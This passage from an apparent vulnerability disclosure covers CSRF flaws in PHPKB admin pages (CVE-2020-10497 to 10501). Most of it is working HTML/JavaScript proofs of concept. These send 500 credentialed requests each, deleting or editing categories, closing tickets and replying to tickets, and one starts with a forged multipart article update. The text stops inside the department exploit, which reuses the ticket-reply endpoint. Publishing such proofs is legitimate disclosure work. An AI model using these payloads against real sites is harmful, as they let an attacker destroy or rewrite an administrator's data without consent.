          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate1</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate4</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">no</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate7</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">no</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">pub_state</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">pri_state</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">0</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">author</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">title</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">txtContent</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">summary</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">make_visible</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">enable_comments</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">enable_ratings</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">publish_date</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">2020-01-11</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">expiry_date</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">2020-01-27</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">filename0</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Type: application/octet-stream</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">filenamecap0</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">totalfiles</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">article_id</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">autosave_id</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">0</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">from_edit_section</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">true</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">preview_section</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">true</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">fromdraftsection</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">mode</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">p</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">c3RhdHVzPW93biZzb3J0PSZvcmRlcj0=</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">UpdateArticleSubmit</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Update Article</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090--</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span> 
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="na">onclick=</span><span class="s">"submitRequest();"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-category-cve-2020-10497">Cross-Site Request Forgery when deleting a category (CVE-2020-10497)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-categories.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “manage categories”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-categories.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=delete</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-category-cve-2020-10498">Cross-Site Request Forgery when editing a category (CVE-2020-10498)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-category.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “manage categories”;</li>
  <li>click on “edit”, then on “save category”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change type parameter to public if you want to make the categories public, else write private --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles --&gt;</span>
<span class="c">&lt;!-- Change the content parameter to change all the categories' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-category.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">type=public&amp;title=dssdadasdssdadas&amp;parent_public=0&amp;parent_private=0&amp;content=dssdadasdssdadasdssdadas&amp;group_permissions=inherit&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;current_status=public&amp;p=&amp;submit=Save+Category</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-closing-a-ticket-cve-2020-10499">Cross-Site Request Forgery when closing a ticket (CVE-2020-10499)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-tickets.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
  <li>select the ticket and click on “close”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">closed</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-tickets.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=close</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-replying-to-a-ticket-cve-2020-10500">Cross-Site Request Forgery when replying to a ticket (CVE-2020-10500)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/reply-ticket.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
  <li>select the ticket, hit “reply back” and click on “save ticket”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the Ticket's reply titles--&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the Ticket's reply body--&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">replied</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/reply-ticket.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=titleticket&amp;txtContent=replytext&amp;close_ticket=yes&amp;type=public&amp;nstate1=no&amp;nstate4=no&amp;nstate7=no&amp;pub_state=1&amp;pri_state=0&amp;keywords=&amp;summary=&amp;tid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;for_preview_section=true&amp;from=&amp;p=&amp;Submit=Send+Reply</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-department-cve-2020-10501">Cross-Site Request Forgery when editing a department (CVE-2020-10501)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “department”;</li>
  <li>click on “edit”, then on “save department”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the name parameter to edit all the deparments's names --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">replied</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/reply-ticket.php</span><span class="dl">"</span><span class="p">)</span>
